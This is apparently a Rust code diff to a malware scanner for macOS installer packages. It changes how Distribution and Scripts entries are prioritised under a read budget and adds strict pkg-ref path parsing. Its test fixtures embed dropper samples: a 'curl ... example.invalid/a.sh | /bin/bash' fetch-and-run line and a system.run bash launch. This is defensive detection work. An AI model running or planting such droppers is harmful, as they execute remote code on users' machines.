@@ -19,6 +19,7 @@ use crate::macho::ByteSource;
 use crate::model::{MatchedSignal, SignalCategory};
 use crate::scan::scan_embedded_bytes;
 use crate::{cpio, xar, xml};
+use std::collections::{HashMap, HashSet};
 
 /// Ceiling on what the script rule can contribute — the sub-scan total climbs
 /// fast when several markers match, and Phase 0a scoring is a plain sum (§12).
@@ -78,38 +79,139 @@ impl InstallerScriptRule {
         let mut unreadable = false;
         let mut budget = xar::ReadBudget::new(limits);
 
-        // Cheapest to read first: small real entries are read in full before
-        // large or padded ones, and their unused allowance carries forward.
-        // Ties keep shallower, then TOC, order (the sort is stable). An entry
-        // that cannot be read at all takes no share.
-        let mut work = Vec::new();
+        let mut entries = Vec::new();
         let wanted = archive
             .metadata_entries()
             .filter(|e| matches!(e.name.as_str(), "Scripts" | "Distribution"));
         for (toc_index, entry) in wanted.enumerate() {
-            match xar::entry_cost(content, &archive, entry) {
-                Ok(cost) => work.push((toc_index, cost, entry, ScriptFindings::default())),
-                Err(_) => unreadable = true,
+            let cost = xar::entry_cost(content, &archive, entry).ok();
+            unreadable |= cost.is_none();
+            entries.push(Wanted {
+                toc_index,
+                entry,
+                cost,
+            });
+        }
+
+        let is_file = |w: &Wanted| w.entry.kind != xar::XarKind::Directory;
+        // First `Scripts` in TOC order for each path, as Installer resolves it.
+        let mut scripts_by_path: HashMap<&str, usize> = HashMap::new();
+        for (i, w) in entries.iter().enumerate() {
+            if w.entry.name == "Scripts" && is_file(w) {
+                scripts_by_path.entry(w.entry.path.as_str()).or_insert(i);
             }
         }
-        work.sort_by_key(|(_, cost, entry, _)| (*cost, entry.depth));
+        let readable_scripts = entries
+            .iter()
+            .filter(|w| w.entry.name == "Scripts" && w.cost.is_some())
+            .count();
 
-        // Findings are merged in TOC order below, so the report does not
-        // depend on read order.
-        let total = work.len();
-        for (rank, (_, _, entry, found)) in work.iter_mut().enumerate() {
-            budget.start_entry(total - rank);
-            let result = if entry.name == "Scripts" {
-                scan_scripts_entry(ctx, content, &archive, entry, &mut budget, found)
-            } else {
-                scan_distribution_entry(ctx, content, &archive, entry, &mut budget, found)
-            };
-            unreadable |= result.is_err();
+        let mut taken = vec![false; entries.len()];
+        let mut seen = HashSet::new();
+        let mut found_by_entry: Vec<(usize, ScriptFindings)> = Vec::new();
+
+        // The entries Installer runs go first, so padding elsewhere cannot
+        // shrink their allowance (§5.2).
+        let mut installer_scripts = Vec::new();
+        let first_dist = entries
+            .iter()
+            .position(|w| w.entry.name == "Distribution" && w.entry.depth == 0 && is_file(w));
+        if let Some(d) = first_dist {
+            taken[d] = true;
+            let dist = &entries[d];
+            if dist.cost.is_some() {
+                seen.insert(range_key(dist.entry));
+                // Its pkg-refs name Scripts that still need a share.
+                budget.start_share(if readable_scripts > 0 { 2 } else { 1 });
+                let mut found = ScriptFindings::default();
+                let resolve = |path: &str| {
+                    scripts_by_path
+                        .get(format!("{path}/Scripts").as_str())
+                        .copied()
+                        .filter(|j| entries[*j].cost.is_some())
+                };
+                let query = RefQuery {
+                    max: readable_scripts,
+                    resolve: &resolve,
+                };
+                match scan_distribution_entry(
+                    ctx,
+                    content,
+                    &archive,
+                    dist.entry,
+                    &mut budget,
+                    &mut found,
+                    Some(&query),
+                ) {
+                    Ok(Some(refs)) => {
+                        for j in refs {
+                            if !taken[j] {
+                                taken[j] = true;
+                                installer_scripts.push(j);
+                            }
+                        }
+                    }
+                    Ok(None) => {}
+                    Err(_) => unreadable = true,
+                }
+                found_by_entry.push((dist.toc_index, found));
+            }
+        } else if let Some(j) = entries
+            .iter()
+            .position(|w| w.entry.name == "Scripts" && w.entry.depth == 0 && is_file(w))
+        {
+            taken[j] = true;
+            installer_scripts.push(j);
         }
-        work.sort_by_key(|(toc_index, _, _, _)| *toc_index);
 
+        let rest: Vec<usize> = (0..entries.len()).filter(|i| !taken[*i]).collect();
+        for group in [installer_scripts, rest] {
+            // Cheapest to read first: small real entries are read in full
+            // before large or padded ones, and their unused allowance carries
+            // forward. Ties go to the shallower, then the earlier TOC entry. An
+            // entry that cannot be read at all takes no share, and a repeat of
+            // an already-read heap range takes none either.
+            let mut work: Vec<usize> = group
+                .into_iter()
+                .filter(|i| entries[*i].cost.is_some())
+                .collect();
+            work.sort_by_key(|i| (entries[*i].cost, entries[*i].entry.depth, *i));
+            work.retain(|i| seen.insert(range_key(entries[*i].entry)));
+
+            let total = work.len();
+            for (rank, i) in work.into_iter().enumerate() {
+                budget.start_entry(total - rank);
+                let mut found = ScriptFindings::default();
+                let result = if entries[i].entry.name == "Scripts" {
+                    scan_scripts_entry(
+                        ctx,
+                        content,
+                        &archive,
+                        entries[i].entry,
+                        &mut budget,
+                        &mut found,
+                    )
+                } else {
+                    scan_distribution_entry(
+                        ctx,
+                        content,
+                        &archive,
+                        entries[i].entry,
+                        &mut budget,
+                        &mut found,
+                        None,
+                    )
+                    .map(|_| ())
+                };
+                unreadable |= result.is_err();
+                found_by_entry.push((entries[i].toc_index, found));
+            }
+        }
+
+        // Merged in TOC order, so the report does not depend on read order.
+        found_by_entry.sort_by_key(|(toc_index, _)| *toc_index);
         let mut findings = ScriptFindings::default();
-        for (_, _, _, found) in work {
+        for (_, found) in found_by_entry {
             findings.total = findings.total.saturating_add(found.total);
             findings.descriptions.extend(found.descriptions);
         }
@@ -134,6 +236,18 @@ impl InstallerScriptRule {
             category: self.category(),
         }))
     }
+}
+
+/// A `Scripts` or `Distribution` TOC entry; `cost` is `None` if unreadable.
+struct Wanted<'a> {
+    toc_index: usize,
+    entry: &'a xar::XarFile,
+    cost: Option<usize>,
+}
+
+/// Identity of an entry's heap bytes: entries sharing one are read once.
+fn range_key(entry: &xar::XarFile) -> (bool, Option<u64>, Option<u64>) {
+    (entry.name == "Scripts", entry.offset, entry.length)
 }
 
 /// Signal descriptions and summed weight collected across scanned script text.
@@ -505,7 +619,16 @@ fn strip_tags(seg: &[u8]) -> Vec<u8> {
     out
 }
 
-/// Reads the `Distribution` entry and scans its JavaScript. Errors with
+/// Which `pkg-ref` paths to collect: at most `max`, each one `resolve` maps
+/// to a `Scripts` entry index.
+struct RefQuery<'a> {
+    max: usize,
+    resolve: &'a dyn Fn(&str) -> Option<usize>,
+}
+
+/// Reads the `Distribution` entry and scans its JavaScript. With a `refs`
+/// query and a full, clean read, returns the entries its `pkg-ref`s name
+/// (`None` if any reference is ambiguous, see [`pkg_ref_paths`]). Errors with
 /// `NotApplicable` if it can't be read or parsed in full.
 fn scan_distribution_entry(
     ctx: &ScanContext,
@@ -514,7 +637,8 @@ fn scan_distribution_entry(
     entry: &xar::XarFile,
     budget: &mut xar::ReadBudget,
     findings: &mut ScriptFindings,
-) -> Result<(), RuleOutcome> {
+    refs: Option<&RefQuery>,
+) -> Result<Option<Vec<usize>>, RuleOutcome> {
     let (raw, gap) = budget
         .read_entry_partial(content, archive, entry)
         .map_err(|_| RuleOutcome::NotApplicable)?;
@@ -531,7 +655,7 @@ fn scan_distribution_entry(
             if gap.is_some() {
                 return Err(RuleOutcome::NotApplicable);
             }
-            Ok(())
+            Ok(refs.and_then(|q| pkg_ref_paths(text, q)))
         }
         Err(_) => {
             // Bytes we hold but could not parse are still evidence: scan what
@@ -557,6 +681,123 @@ fn scan_distribution_entry(
             Err(RuleOutcome::NotApplicable)
         }
     }
+}
+
+/// Entries named by `<pkg-ref>#path</pkg-ref>` elements, in document order,
+/// distinct, at most `query.max`. Only `#`-prefixed values name an archive
+/// member; the `#` is stripped and the rest percent-decoded.
+///
+/// `None` (trust no reference) if any reference could resolve differently in
+/// Installer: CDATA or child elements inside it, non-ASCII or control
+/// characters, a non-plain path (empty, `.` or `..` segment), or a `%` escape
+/// for a byte of 0x80 or above, `/` or NUL.
+fn pkg_ref_paths(text: &[u8], query: &RefQuery) -> Option<Vec<usize>> {
+    let mut found = Vec::new();
+    let mut seen = HashSet::new();
+    let mut scanner = xml::Scanner::new(text);
+    let mut open: Option<&[u8]> = None;
+    let mut content = Vec::new();
+    loop {
+        let event = match scanner.next_event() {
+            xml::Next::Event(event) => event,
+            xml::Next::End => return open.is_none().then_some(found),
+            xml::Next::Bad => return None,
+        };
+        match (event, open) {
+            (
+                xml::Event::Open {
+                    name: "pkg-ref",
+                    self_closing: false,
+                    ..
+                },
+                None,
+            ) => {
+                open = Some(scanner.rest());
+                content.clear();
+            }
+            // Skipped as `distribution_pieces` skips it: raw text, not markup.
+            (
+                xml::Event::Open {
+                    name: "script",
+                    self_closing: false,
+                    ..
+                },
+                None,
+            ) => {
+                scanner.raw_until_close("script")?;
+            }
+            (xml::Event::Open { .. }, Some(_)) => return None,
+            (xml::Event::Text(t), Some(_)) => content.extend_from_slice(t),
+            (xml::Event::Close { name: "pkg-ref" }, Some(start)) => {
+                let span = start.get(..start.len().checked_sub(scanner.rest().len())?)?;
+                if xml::find(span, b"<![CDATA[").is_some() {
+                    return None;
+                }
+                open = None;
+                if let Some(path) = ref_path(&content)? {
+                    let hit = (query.resolve)(&path);
+                    if let Some(j) = hit.filter(|j| found.len() < query.max && seen.insert(*j)) {
+                        found.push(j);
+                    }
+                }
+            }
+            (xml::Event::Close { .. }, Some(_)) => return None,
+            _ => {}
+        }
+    }
+}
+
+/// The archive path named by one `pkg-ref`'s text: `Some(None)` if it names
+/// nothing in the archive, `None` if it is ambiguous (see [`pkg_ref_paths`]).
+fn ref_path(content: &[u8]) -> Option<Option<String>> {
+    if !content.is_ascii() {
+        return None;
+    }
+    let decoded = xml::decode_entities(content);
+    let odd_control = |b: u8| b.is_ascii_control() && !b.is_ascii_whitespace();
+    // A `&` not from `&amp;` is an entity libxml2 may expand and we didn't.
+    let unexpanded = || {
+        let rest = String::from_utf8_lossy(content).replace("&amp;", "");
+        xml::decode_entities(rest.as_bytes()).contains('&')
+    };
+    if !decoded.is_ascii() || decoded.bytes().any(odd_control) || unexpanded() {
+        return None;
+    }
+    let value = decoded.trim_matches(|c: char| c.is_ascii_whitespace());
+    let Some(raw) = value.strip_prefix('#') else {
+        return Some(None);
+    };
+    let path = percent_decode(raw)?;
+    let plain = !path.bytes().any(|b| b.is_ascii_control())
+        && path.split('/').all(|seg| !matches!(seg, "" | "." | ".."));
+    plain.then_some(Some(path))
+}
+
+/// Decodes `%XX` escapes. `None` for a malformed escape (unmeasured in
+/// Installer) or one that decodes to a byte of 0x80 or above, `/` or NUL.
+fn percent_decode(s: &str) -> Option<String> {
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+    while let Some(&c) = b.get(i) {
+        let hex = |k: usize| b.get(k).and_then(|d| (*d as char).to_digit(16));
+        match (c, hex(i + 1), hex(i + 2)) {
+            (b'%', Some(hi), Some(lo)) => {
+                let v = u8::try_from(hi * 16 + lo).ok()?;
+                if v >= 0x80 || v == b'/' || v == 0 {
+                    return None;
+                }
+                out.push(v);
+                i += 3;
+            }
+            (b'%', _, _) => return None,
+            _ => {
+                out.push(c);
+                i += 1;
+            }
+        }
+    }
+    String::from_utf8(out).ok()
 }
 
 /// Records the interpreter launch and content-rule findings in `js`.
@@ -1914,6 +2155,39 @@ mod tests {
         distribution_at(ZLIB_ORDINARY.len(), ZLIB_DROPPER.len(), depth)
     }
 
+    /// `n` padding `Distribution`s at `depth`, each over its own copy of the
+    /// benign blob, then (if `dropper_depth` is set) the dropper.
+    ///
+    /// `lead` puts an ordinary depth-0 `Distribution` first in the TOC, so
+    /// the rest (including a depth-0 dropper) is read in the low-priority group.
+    fn distinct_padding_archive(
+        n: usize,
+        depth: usize,
+        dropper_depth: Option<usize>,
+        lead: bool,
+    ) -> Vec<u8> {
+        let len = ZLIB_ORDINARY.len();
+        let lead_at = n * len + ZLIB_DROPPER.len();
+        let mut toc = if lead {
+            distribution_at(lead_at, len, 0)
+        } else {
+            String::new()
+        };
+        toc += &(0..n)
+            .map(|i| distribution_at(i * len, len, depth))
+            .collect::<String>();
+        if let Some(d) = dropper_depth {
+            toc += &distribution_at(n * len, ZLIB_DROPPER.len(), d);
+        }
+        let mut bytes = xar::toc_xar_bytes(&toc);
+        for _ in 0..n {
+            bytes.extend_from_slice(ZLIB_ORDINARY);
+        }
+        bytes.extend_from_slice(ZLIB_DROPPER);
+        bytes.extend_from_slice(ZLIB_ORDINARY);
+        bytes
+    }
+
     fn evaluate_small(
         bytes: &[u8],
         limits: &xar::XarLimits,
@@ -1928,7 +2202,7 @@ mod tests {
         let one = budget_archive(&benign(0));
         assert!(matches!(evaluate_small(&one, &limits).0, Ok(None)));
 
-        let many = budget_archive(&benign(0).repeat(50));
+        let many = distinct_padding_archive(50, 0, None, false);
         let (r, _) = evaluate_small(&many, &limits);
         assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
 
@@ -1951,8 +2225,7 @@ mod tests {
     #[test]
     fn a_small_dropper_is_read_despite_nested_padding() {
         let limits = small_limits();
-        let toc = format!("{}{}", benign(1).repeat(50), dropper(0));
-        let (r, c) = evaluate_small(&budget_archive(&toc), &limits);
+        let (r, c) = evaluate_small(&distinct_padding_archive(50, 1, Some(0), true), &limits);
         let signal = r.expect("evaluates").expect("the dropper scores");
         assert!(
             signal.description.contains("launches an interpreter"),
@@ -2088,8 +2361,7 @@ mod tests {
             max_read_back_bytes: 64 * 1024,
             ..xar::XarLimits::default()
         };
-        let toc = format!("{}{}", benign(0).repeat(200), dropper(0));
-        let (r, c) = evaluate_small(&budget_archive(&toc), &limits);
+        let (r, c) = evaluate_small(&distinct_padding_archive(200, 0, Some(0), true), &limits);
         let signal = r.expect("evaluates").expect("the dropper scores");
         assert!(signal.description.contains("launches an interpreter"));
         assert!(c.marked_incomplete("installer-script-suspicious"));
@@ -2445,5 +2717,418 @@ mod tests {
         // Through the rule, the same archive is never reported clean.
         let (r, _) = evaluate_small(&bytes, &limits);
         assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
+    }
+
+    /// Heap under construction; `add` returns the `(offset, length)` it landed at.
+    #[derive(Default)]
+    struct Heap(Vec<u8>);
+
+    impl Heap {
+        fn add(&mut self, bytes: &[u8]) -> (usize, usize) {
+            let at = self.0.len();
+            self.0.extend_from_slice(bytes);
+            (at, bytes.len())
+        }
+    }
+
+    fn file(name: &str, (offset, len): (usize, usize)) -> String {
+        format!(
+            r#"<file><name>{name}</name><type>file</type><data><offset>{offset}</offset><length>{len}</length><size>{len}</size></data></file>"#
+        )
+    }
+
+    /// `leaf` inside the `/`-separated directories of `path` (none if empty).
+    fn nested(path: &str, leaf: String) -> String {
+        let dirs = path.split('/').filter(|d| !d.is_empty());
+        dirs.rev().fold(leaf, |inner, d| {
+            format!("<file><name>{d}</name><type>directory</type>{inner}</file>")
+        })
+    }
+
+    fn archive(toc: &str, heap: &Heap) -> Vec<u8> {
+        let mut bytes = xar::toc_xar_bytes(toc);
+        bytes.extend_from_slice(&heap.0);
+        bytes
+    }
+
+    /// A `Scripts` blob (zlib over gzip over cpio) whose `member` is a dropper.
+    fn scripts_blob(member: &str) -> Vec<u8> {
+        let body = b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n".repeat(6);
+        let mut cpio = odc_member(member, &body);
+        cpio.extend(odc_member("TRAILER!!!", b""));
+        zlib_stored(&gzip_stored(&cpio))
+    }
+
+    fn distribution_xml(refs: &[&str]) -> Vec<u8> {
+        let refs: String = refs
+            .iter()
+            .map(|r| format!(r#"<pkg-ref id="x">{r}</pkg-ref>"#))
+            .collect();
+        format!("<installer-gui-script>{refs}</installer-gui-script>").into_bytes()
+    }
+
+    /// `n` unreferenced `Distribution`/`Scripts` entries, each a distinct 200-byte
+    /// window of one shared blank blob: cheaper than any real `Scripts`.
+    fn padding(heap: &mut Heap, n: usize) -> String {
+        const WINDOW: usize = 200;
+        let (base, _) = heap.add(&vec![b' '; n + WINDOW]);
+        (0..n)
+            .map(|i| {
+                let name = if i % 2 == 0 {
+                    "Distribution"
+                } else {
+                    "Scripts"
+                };
+                nested("pad", file(name, (base + i, WINDOW)))
+            })
+            .collect()
+    }
+
+    /// A product archive: `dists` (raw bytes, TOC order), then each `(dir, member)`
+    /// component with a dropper `Scripts`, then `pads` padding entries.
+    fn product_with(dists: &[Vec<u8>], comps: &[(&str, &str)], pads: usize) -> Vec<u8> {
+        let mut heap = Heap::default();
+        let mut toc = String::new();
+        for d in dists {
+            toc += &file("Distribution", heap.add(d));
+        }
+        for (path, member) in comps {
+            let range = heap.add(&scripts_blob(member));
+            toc += &nested(path, file("Scripts", range));
+        }
+        toc += &padding(&mut heap, pads);
+        archive(&toc, &heap)
+    }
+
+    fn product(refs: &[&str], comps: &[(&str, &str)], pads: usize) -> Vec<u8> {
+        product_with(&[distribution_xml(refs)], comps, pads)
+    }
+
+    fn padding_limits() -> xar::XarLimits {
+        xar::XarLimits {
+            max_entry_bytes: 4096,
+            max_read_back_bytes: 64 * 1024,
+            ..xar::XarLimits::default()
+        }
+    }
+
+    /// Enough padding that an equal share of the budget is below one `Scripts`.
+    fn starving_padding(limits: &xar::XarLimits) -> usize {
+        let n = 2 * limits.max_read_back_bytes / scripts_blob("preinstall").len();
+        assert!(n < limits.max_entries);
+        n
+    }
+
+    /// The finding's description (`None` for exactly `Err(NotApplicable)`) and
+    /// whether a gap was marked. Panics on a clean `Ok(None)`: these archives
+    /// always hold either a finding or something unread.
+    fn found(bytes: &[u8], limits: &xar::XarLimits) -> (Option<String>, bool) {
+        let (r, c) = evaluate_small(bytes, limits);
+        let description = match r {
+            Ok(Some(signal)) => Some(signal.description),
+            Err(RuleOutcome::NotApplicable) => None,
+            other => panic!("{other:?}"),
+        };
+        (
+            description,
+            c.marked_incomplete("installer-script-suspicious"),
+        )
+    }
+
+    #[test]
+    fn padding_cannot_starve_a_referenced_scripts() {
+        let limits = padding_limits();
+        let pads = starving_padding(&limits);
+        let comps = [("comp.pkg", "preinstall")];
+
+        let (d, incomplete) = found(&product(&["#comp.pkg"], &comps, pads), &limits);
+        assert!(d.expect("scores").contains("install script preinstall"));
+        assert!(incomplete);
+
+        // Unreferenced, the same entry is starved.
+        let (d, _) = found(&product(&[], &comps, pads), &limits);
+        assert_eq!(d, None);
+        let (d, _) = found(&product(&[], &comps, 0), &limits);
+        assert!(d.is_some());
+    }
+
+    #[test]
+    fn only_the_first_top_level_distribution_names_components() {
+        let limits = padding_limits();
+        let pads = starving_padding(&limits);
+        let comps = [("a.pkg", "preinstall"), ("b.pkg", "postinstall")];
+        let dists = [distribution_xml(&["#a.pkg"]), distribution_xml(&["#b.pkg"])];
+
+        let (d, incomplete) = found(&product_with(&dists, &comps, pads), &limits);
+        let d = d.expect("scores");
+        assert!(d.contains("install script preinstall"), "{d}");
+        assert!(!d.contains("postinstall"), "{d}");
+        assert!(incomplete);
+
+        let (d, _) = found(&product_with(&dists, &comps, 0), &limits);
+        let d = d.expect("scores");
+        assert!(d.contains("preinstall") && d.contains("postinstall"), "{d}");
+    }
+
+    #[test]
+    fn a_second_distribution_is_still_scanned() {
+        let launch = br#"<a><script>system.run("/bin/bash", "-c", "x");</script></a>"#;
+        let dists = [distribution_xml(&[]), launch.to_vec()];
+        let bytes = product_with(&dists, &[], 0);
+        let (d, incomplete) = found(&bytes, &padding_limits());
+        assert!(d.expect("scores").contains("launches an interpreter"));
+        assert!(!incomplete);
+    }
+
+    #[test]
+    fn an_unreferenced_component_is_still_scored() {
+        let comps = [("a.pkg", "preinstall"), ("b.pkg", "postinstall")];
+        let bytes = product(&["#a.pkg"], &comps, 0);
+        let (d, _) = found(&bytes, &padding_limits());
+        let d = d.expect("scores");
+        assert!(d.contains("preinstall") && d.contains("postinstall"), "{d}");
+    }
+
+    #[test]
+    fn an_unreadable_distribution_names_no_components() {
+        let limits = padding_limits();
+        let pads = starving_padding(&limits);
+        let comps = [("comp.pkg", "preinstall")];
+
+        let mut over_cap = distribution_xml(&["#comp.pkg"]);
+        over_cap.resize(limits.max_entry_bytes + 100, b' ');
+        for dist in [b"<a><b".to_vec(), over_cap] {
+            let dists = [dist];
+            let (d, incomplete) = found(&product_with(&dists, &comps, 0), &limits);
+            assert!(d.is_some() && incomplete);
+            let (d, _) = found(&product_with(&dists, &comps, pads), &limits);
+            assert_eq!(d, None);
+        }
+
+        // Out of the heap: no cost, no read.
+        let mut heap = Heap::default();
+        let range = heap.add(&scripts_blob("preinstall"));
+        let toc = format!(
+            "{}{}{}",
+            file("Distribution", (heap.0.len() + 1000, 50)),
+            nested("comp.pkg", file("Scripts", range)),
+            padding(&mut heap, pads)
+        );
+        let (d, _) = found(&archive(&toc, &heap), &limits);
+        assert_eq!(d, None);
+    }
+
+    #[test]
+    fn a_flat_package_reads_its_first_top_level_scripts_first() {
+        let limits = padding_limits();
+        let pads = starving_padding(&limits);
+        let comps = [("", "preinstall"), ("", "postinstall")];
+
+        let (d, incomplete) = found(&product_with(&[], &comps, pads), &limits);
+        let d = d.expect("scores");
+        assert!(d.contains("install script preinstall"), "{d}");
+        assert!(!d.contains("postinstall"), "{d}");
+        assert!(incomplete);
+
+        let (d, _) = found(&product_with(&[], &comps, 0), &limits);
+        assert!(d.expect("scores").contains("postinstall"));
+    }
+
+    /// `pkg_ref_paths` over `doc`, resolving every path to itself as an index
+    /// into `names`; `None` is the whole-set distrust result.
+    fn refs_of(doc: &[u8], names: &[&str]) -> Option<Vec<String>> {
+        let resolve = |p: &str| names.iter().position(|n| *n == p);
+        let query = RefQuery {
+            max: names.len(),
+            resolve: &resolve,
+        };
+        let idx = pkg_ref_paths(doc, &query)?;
+        Some(idx.into_iter().map(|i| names[i].to_string()).collect())
+    }
+
+    fn one_ref(text: &str) -> Vec<u8> {
+        format!(r#"<installer-gui-script><pkg-ref id="a">{text}</pkg-ref></installer-gui-script>"#)
+            .into_bytes()
+    }
+
+    #[test]
+    fn script_bodies_are_not_scanned_for_pkg_refs() {
+        let names = ["a.pkg", "b.pkg"];
+        let doc = b"<g><script>if (a < b) x = '<pkg-ref>#b.pkg</pkg-ref>';</script>\
+            <pkg-ref>#a.pkg</pkg-ref></g>";
+        assert_eq!(refs_of(doc, &names).expect("trusted"), ["a.pkg"]);
+        assert_eq!(refs_of(b"<g><script>x", &names), None);
+    }
+
+    #[test]
+    fn pkg_refs_are_decoded_and_filtered() {
+        let doc = br#"<installer-gui-script>
+            <pkg-ref id="a">#my%20comp.pkg</pkg-ref>
+            <pkg-ref id="b">
+               &#35;sub/b&amp;c.pkg
+            </pkg-ref>
+            <pkg-ref id="c">#c.pkg</pkg-ref>
+            <pkg-ref id="d">file:///tmp/x.pkg</pkg-ref>
+            <pkg-ref id="e">/abs/e.pkg</pkg-ref>
+            <pkg-ref id="f">f.pkg</pkg-ref>
+            <pkg-ref id="g"/>
+            <pkg-ref id="i">#my comp.pkg</pkg-ref>
+            <pkg-ref id="j">#unknown.pkg</pkg-ref>
+        </installer-gui-script>"#;
+        let names = ["my comp.pkg", "sub/b&c.pkg", "c.pkg", "f.pkg", "x.pkg"];
+        assert_eq!(
+            refs_of(doc, &names).expect("trusted"),
+            ["my comp.pkg", "sub/b&c.pkg", "c.pkg"]
+        );
+        let capped = RefQuery {
+            max: 2,
+            resolve: &|p| names.iter().position(|n| *n == p),
+        };
+        assert_eq!(pkg_ref_paths(doc, &capped).expect("trusted").len(), 2);
+    }
+
+    #[test]
+    fn ambiguous_pkg_refs_distrust_the_whole_set() {
+        let names = ["a.pkg", "b.pkg", "é.pkg", ".pkg", "a/b.pkg"];
+        assert!(refs_of(&one_ref("#a.pkg"), &names).is_some());
+        let ambiguous: Vec<Vec<u8>> = vec![
+            one_ref("<![CDATA[#a.pkg]]>"),
+            one_ref("#a<![CDATA[]]>.pkg"),
+            one_ref("#<b/>a.pkg"),
+            one_ref("#a.pkg<!-- c --><x>y</x>"),
+            one_ref("#é.pkg"),
+            one_ref("\u{a0}#a.pkg"),
+            one_ref("&#233;.pkg"),
+            one_ref("#&#xa0;a.pkg"),
+            one_ref("#a.pkg&#0;"),
+            one_ref("#a\x0b.pkg"),
+            one_ref("#a&#9;.pkg"),
+            one_ref("#"),
+            one_ref("#/a.pkg"),
+            one_ref("#a.pkg/"),
+            one_ref("#a//b.pkg"),
+            one_ref("#./a.pkg"),
+            one_ref("#a/../b.pkg"),
+            one_ref("#a/./b.pkg"),
+            one_ref("#a%2Fb.pkg"),
+            one_ref("#a%00.pkg"),
+            one_ref("#%C3%A9.pkg"),
+            one_ref("#%2e%2e/a.pkg"),
+            one_ref("#a%0A.pkg"),
+            one_ref("#&e;"),
+            one_ref("#cd%zz.pkg"),
+            one_ref("#a.pkg%4"),
+            one_ref("#a&#00000000000000000000000000000047;b.pkg"),
+            one_ref("#a&b.pkg"),
+            b"<installer-gui-script><pkg-ref id=\"a\">#a.pkg".to_vec(),
+        ];
+        for doc in &ambiguous {
+            let shown = String::from_utf8_lossy(doc);
+            assert_eq!(refs_of(doc, &names), None, "{shown}");
+        }
+        // One ambiguous reference among good ones still voids the set.
+        let mixed = b"<g><pkg-ref>#a.pkg</pkg-ref><pkg-ref>#b/../c</pkg-ref></g>";
+        assert_eq!(refs_of(mixed, &names), None);
+        // A Latin-1 byte in a reference.
+        let latin1 = b"<g><pkg-ref>#caf\xe9.pkg</pkg-ref></g>";
+        assert_eq!(refs_of(latin1, &names), None);
+    }
+
+    #[test]
+    fn an_ambiguous_reference_leaves_every_scripts_in_the_low_priority_group() {
+        let limits = padding_limits();
+        let pads = starving_padding(&limits);
+        let comps = [("a.pkg", "preinstall")];
+        let (d, _) = found(&product(&["#a.pkg"], &comps, pads), &limits);
+        assert!(d.is_some());
+        let (d, _) = found(&product(&["#a.pkg", "#x/../y"], &comps, pads), &limits);
+        assert_eq!(d, None);
+    }
+
+    #[test]
+    fn encoded_pkg_refs_resolve_to_components() {
+        let limits = padding_limits();
+        let pads = starving_padding(&limits);
+        let comps = [
+            ("my comp.pkg", "pre1"),
+            ("sub/b&c.pkg", "pre2"),
+            ("plain.pkg", "pre3"),
+            ("x.pkg", "pre4"),
+        ];
+        let refs = [
+            "#my%20comp.pkg",
+            " &#35;sub/b&amp;c.pkg\n",
+            "plain.pkg",
+            "file:///x.pkg",
+        ];
+        let (d, _) = found(&product(&refs, &comps, pads), &limits);
+        let d = d.expect("scores");
+        assert!(d.contains("pre1") && d.contains("pre2"), "{d}");
+        assert!(!d.contains("pre3") && !d.contains("pre4"), "{d}");
+    }
+
+    #[test]
+    fn a_repeated_heap_range_is_read_once() {
+        let limits = small_limits();
+        let mut heap = Heap::default();
+        let range = heap.add(&distribution_xml(&[]));
+        let toc = file("Distribution", range).repeat(300);
+        assert!(matches!(
+            evaluate_small(&archive(&toc, &heap), &limits).0,
+            Ok(None)
+        ));
+
+        let launch = br#"<a><script>system.run("/bin/bash", "-c", "x");</script></a>"#;
+        let mut heap = Heap::default();
+        let range = heap.add(launch);
+        let once = archive(&file("Distribution", range), &heap);
+        let many = archive(&file("Distribution", range).repeat(300), &heap);
+        let (once, _) = evaluate_small(&once, &limits);
+        let (many, c) = evaluate_small(&many, &limits);
+        let (once, many) = (once.unwrap().unwrap(), many.unwrap().unwrap());
+        assert_eq!(
+            (once.weight, once.description),
+            (many.weight, many.description)
+        );
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    #[test]
+    fn findings_follow_toc_order_not_read_order() {
+        let launch = br##"<a><pkg-ref id="x">#a.pkg</pkg-ref><script>system.run("/bin/bash", "-c", "x");</script></a>"##;
+        let mut heap = Heap::default();
+        let mut toc = nested(
+            "z.pkg",
+            file("Scripts", heap.add(&scripts_blob("postinstall"))),
+        );
+        toc += &file("Distribution", heap.add(launch));
+        toc += &nested(
+            "a.pkg",
+            file("Scripts", heap.add(&scripts_blob("preinstall"))),
+        );
+
+        let (d, _) = found(&archive(&toc, &heap), &padding_limits());
+        let d = d.expect("scores");
+        let at = |needle: &str| d.find(needle).unwrap_or_else(|| panic!("{needle}: {d}"));
+        assert!(at("postinstall") < at("distribution script"));
+        assert!(at("distribution script") < at("install script preinstall"));
+    }
+
+    #[test]
+    fn a_directory_named_distribution_is_not_the_distribution() {
+        let limits = padding_limits();
+        let pads = starving_padding(&limits);
+        let mut heap = Heap::default();
+        let mut toc = String::from("<file><name>Distribution</name><type>directory</type></file>");
+        for member in ["preinstall", "postinstall"] {
+            toc += &file("Scripts", heap.add(&scripts_blob(member)));
+        }
+        toc += &padding(&mut heap, pads);
+        let (d, _) = found(&archive(&toc, &heap), &limits);
+        let d = d.expect("scores");
+        assert!(
+            d.contains("preinstall") && !d.contains("postinstall"),
+            "{d}"
+        );
     }
 }
